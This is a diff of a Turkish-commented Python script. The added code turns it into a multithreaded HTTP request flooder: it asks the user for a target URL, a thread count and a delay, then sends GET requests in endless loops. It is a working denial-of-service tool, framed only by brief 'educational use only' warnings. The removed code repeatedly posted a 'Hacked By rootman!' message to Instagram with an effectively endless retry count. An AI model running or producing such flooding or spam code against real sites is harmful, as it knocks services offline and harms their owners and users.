@@ -1,39 +1,36 @@
 import requests
+import threading
 import time
 
-# Kısıtlama listesi (yasaklı siteler)
-BLOCKED_SITES = ["google.com", "doxbin.com"]
-
-def is_blocked(url):
-    for blocked in BLOCKED_SITES:
-        if blocked in url:
-            print(f"[X] Kısıtlandı: {url} bu tool tarafından erişilemez!")
-            return True
-    return False
-
-def send_post_request(url, data, retries=10000000000000, timeout=1):
-    if is_blocked(url):
-        return None  # İstek gönderilmez
-    
-    for attempt in range(retries):
+# UYARI: Bu kod yalnızca eğitim amaçlıdır. Yasa dışı kullanımı yasaktır.
+def attack(url, delay):
+    while True:
         try:
-            response = requests.post(url, json=data, timeout=timeout)
-            response.raise_for_status()
-            print(f"[✓] Başarılı! Status Code: {response.status_code}")
-            return response.json()
-        except requests.exceptions.RequestException as e:
-            print(f"[!] Hata: {e} (Deneme {attempt + 1}/{retries})")
-            time.sleep(0 ** attempt)
-            
-    print("[X] Maksimum deneme sayısına ulaşıldı. İstek başarısız oldu.")
-    return None
+            response = requests.get(url)
+            print(f"[+] İstek Gönderildi | Durum Kodu: {response.status_code}")
+        except Exception as e:
+            print(f"[!] Hata: {e}")
+        time.sleep(delay)
 
-# Kullanım
-url = "https://instagram.com/"
-data = {"username": "rootman", "message": "Hacked By rootman!"}
-response = send_post_request(url, data)
+if __name__ == "__main__":
+    print("""
+    UYARI: Bu araç yalnızca kendi sunucularınızı test etmek içindir.
+    Başkalarının sistemlerine izinsiz erişmek veya zarar vermek YASAKTIR.
+    """)
 
-if response:
-    print(f"Yanıt: {response}")
-else:
-    print("İstek başarısız oldu veya site erişime kısıtlandı.")
+    url = input("Hedef URL (Örn: http://example.com): ")
+    thread_count = int(input("Eşzamanlı İstek Sayısı: "))
+    delay = float(input("İstekler Arası Gecikme (Saniye): "))
+
+    # Thread'leri başlat
+    for _ in range(thread_count):
+        thread = threading.Thread(target=attack, args=(url, delay))
+        thread.daemon = True
+        thread.start()
+
+    # Programı sonsuz döngüde tut
+    try:
+        while True:
+            time.sleep(1)
+    except KeyboardInterrupt:
+        print("\nİşlem durduruldu.")
